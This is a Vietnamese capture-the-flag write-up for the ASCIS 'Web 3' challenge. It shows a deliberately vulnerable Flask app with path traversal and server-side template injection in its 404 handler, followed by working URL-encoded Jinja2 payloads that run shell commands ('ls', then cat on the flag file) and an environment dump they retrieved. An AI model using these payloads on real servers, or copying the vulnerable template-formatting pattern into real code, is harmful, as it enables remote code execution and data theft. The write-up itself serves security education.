# ASCIS - Web 3
**Solver: goldensang**

### 1. Context
Ban đầu bài này cho code, chỉ có 1 file thôi là **main.py**
```python
#!/usr/bin/python
# -*- coding: utf-8 -*-

import os
from flask import Flask, render_template_string, abort, request

app = Flask(__name__)


@app.errorhandler(404)
def page_not_found(e):
    if e.description:
        template = \
            '''
		<h1> Secbiz library </h1>
		<div class ="row">
		<div class = "col-md-6 col-md-offset-3 center" >
		Oops! Why you don't look at our <a href="/"> library</a>?
        <p></p>
        <b>%s</b> not found
		</div>
		</div>
		''' % e.description
    else:
        template = \
            '''
		<h1> Secbiz library </h1>
		<div class ="row">
		<div class = "col-md-6 col-md-offset-3 center" >
		Oops! Why you don't look at our <a href="/"> library</a>?
		</div>
		</div>
		'''

    return (render_template_string(template), 404)

app.register_error_handler(404, page_not_found)


@app.route('/', defaults={'req_path': ''})
@app.route('/<path:req_path>')
def dir_listing(req_path):
    debug_mode = request.args.get('DEBUG_MODE_ENABLED', None)
    BASE_DIR = os.environ['BASE_DIR']

    # Joining the base and the requested path
    abs_path = os.path.join(BASE_DIR, req_path.replace('../', ''))

    # Return 404 if path doesn't exist
    if not os.path.exists(abs_path):
        return abort(404, description=(req_path if debug_mode else ''))
    

    # Check if path is a file and serve

    if os.path.isfile(abs_path):
        return open(abs_path, 'rb').read()

    # Show directory contents
    files = os.listdir(abs_path)
    return render_template_string("""
        <h1>Welcome to Secbiz library</h1>
        <ul>
        {% for file in files %}
        <li>
        <a href="{{ (request.path + '/' if request.path != '/' else '') + file }}">
            {{ (request.path + '/' if request.path != '/' else '') + file }}
        </a>
        </li>
        {% endfor %}
        </ul>
        """,files=files)

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=5000)

```

Thoạt nhìn bài này thị có thể LFI - Directory Traversal, thì cũng có 1 payload work, nhưng tụi mình bị bí payload này:
 /%2e%2e%2e%2f%2e%2f/%2e%2e%2e%2f%2e%2
 
 Nhưng tụi mình không biết làm gì tiếp theo với payload
 
 Sau khi ngồi đọc code 1 xíu, thì mình thấy một khúc rất hay:
 ```python
@app.errorhandler(404)
def page_not_found(e):
    if e.description:
        template = \
            '''
        <h1> Secbiz library </h1>
        <div class ="row">
        <div class = "col-md-6 col-md-offset-3 center" >
        Oops! Why you don't look at our <a href="/"> library</a>?
        <p></p>
        <b>%s</b> not found
        </div>
        </div>
        ''' % e.description
    else:
        template = \
            '''
        <h1> Secbiz library </h1>
        <div class ="row">
        <div class = "col-md-6 col-md-offset-3 center" >
        Oops! Why you don't look at our <a href="/"> library</a>?
        </div>
        </div>
        '''
    return (render_template_string(template), 404)
```
Thì sau khi phân tích flow chạy thì mình nhận ra như sau:
Request -> dir_listing() -> DEBUG_MODE_ENABLE=true, nên khi gọi vào hàm 404, thì nó sẽ inject req.path để exec SSTI -> trả về giá trị qua e.message

Thì vấn đề bây giờ là tìm payload SSTI phù hợp, thì sau khi test 1 hồi thì payload mình xài là:
```
7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%22ls%22%29.read%28%29%7D%7D%7B%25endif%25%7D%7B%25%20endfor%20%25%7D?DEBUG_MODE_ENABLED=true
```

Tụi mình check printenv để tìm ra vị trí flag:```
UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgi SUPERVISOR_GROUP_NAME=uwsgi **FLAG_DIR**=/opt/y5oyqodQ3BCjCdVSxQuL HOSTNAME=2878e057461a PYTHON_PIP_VERSION=20.1 HOME=/root GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568 UWSGI_INI=/app/uwsgi.ini NGINX_MAX_UPLOAD=0 UWSGI_PROCESSES=16 STATIC_URL=/static PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/1fe530e9e3d800be94e04f6428460fc4fb94f5a9/get-pip.py UWSGI_CHEAPER=2 BASE_DIR=/opt/data PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin LANG=C.UTF-8 SUPERVISOR_ENABLED=1 PYTHON_VERSION=3.8.2 NGINX_WORKER_PROCESSES=1 SUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sock SUPERVISOR_PROCESS_NAME=uwsgi LISTEN_PORT=80 STATIC_INDEX=0 PWD=/app PYTHON_GET_PIP_SHA256=ce486cddac44e99496a702aa5c06c5028414ef48fdfd5242cd2fe559b13d4348 STATIC_PATH=/app/static PYTHONPATH=/app UWSGI_RELOADS=0 not found
```
**FLAG_DIR**=/opt/y5oyqodQ3BCjCdVSxQuL

rồi sau đó chỉ việc cat đó ra thôi
Final payload:
```
http://45.77.33.129:5000/%7B%25%20for%20x%20in%20%28%29.__class__.__base__.__subclasses__%28%29%20%25%7D%7B%25%20if%20%22warning%22%20in%20x.__name__%20%25%7D%7B%7Bx%28%29._module.__builtins__%5B%27__import__%27%5D%28%27os%27%29.popen%28%22cat%20..%2Fopt%2Fy5oyqodQ3BCjCdVSxQuL%22%29.read%28%29%7D%7D%7B%25endif%25%7D%7B%25%20endfor%20%25%7D?DEBUG_MODE_ENABLED=true
```
